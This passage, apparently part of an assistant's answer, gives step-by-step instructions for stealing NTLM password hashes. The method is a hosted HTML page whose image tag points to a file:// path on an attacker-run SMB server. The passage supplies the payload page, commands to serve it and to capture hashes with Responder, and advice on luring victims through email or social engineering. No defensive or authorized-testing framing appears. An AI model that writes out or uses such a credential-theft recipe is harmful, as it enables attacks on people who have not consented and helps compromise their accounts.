 add the `<img>` tag with the `src` pointing to the malicious `file://` or UNC path to a webpage that you are hosting. 

### How It Works

1. **Host the Webpage:**
   - You create and host a webpage that contains the malicious `<img>` tag.
   - When the page is loaded by a victim's browser, the browser attempts to load the image from the `file://` or UNC path, which is your SMB server.

2. **Trigger the NTLM Hash Theft:**
   - When the victim's browser tries to load the image from your SMB server, it will send an NTLM authentication request to your server.
   - This will allow you to capture the NTLM hash of the victim's account.

### Example HTML Page

Here's an example of a simple HTML page you could host:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Malicious Image Test</title>
</head>
<body>
    <h1>Loading Image...</h1>
    <img src="file://your-smb-server-ip/image.png" alt="Loading Image...">
</body>
</html>
```

### Steps to Execute

1. **Create the HTML Page:**
   - Use the HTML code above and save it as an `.html` file (e.g., `index.html`).

2. **Host the HTML Page:**
   - Host this HTML file on a web server that you control. This could be a simple HTTP server running on your machine.

   - **Example using Python's HTTP server:**
     ```bash
     python3 -m http.server 8080
     ```

   - Place the `index.html` in the directory where you're running the server.

3. **Set Up Your SMB Server:**
   - Ensure your SMB server is running and ready to capture NTLM hashes.

   - **Example with Responder:**
     ```bash
     responder -I eth0 -wrf
     ```

4. **Direct Victims to the Hosted Page:**
   - Send a link to your hosted page (e.g., `http://your-server-ip:8080/index.html`) to the target. This could be done via email, social engineering, or any method that gets the target to visit the page.

5. **Capture the NTLM Hash:**
   - When the victim's browser loads the page, it attempts to load the image from the `file://` path, causing it to authenticate to your SMB server.
   - Responder or another SMB server tool captures the NTLM hash.

### Important Considerations

- **Browser Behavior:** Modern browsers might block `file://` links or give warnings. However, some browsers and configurations may still allow this behavior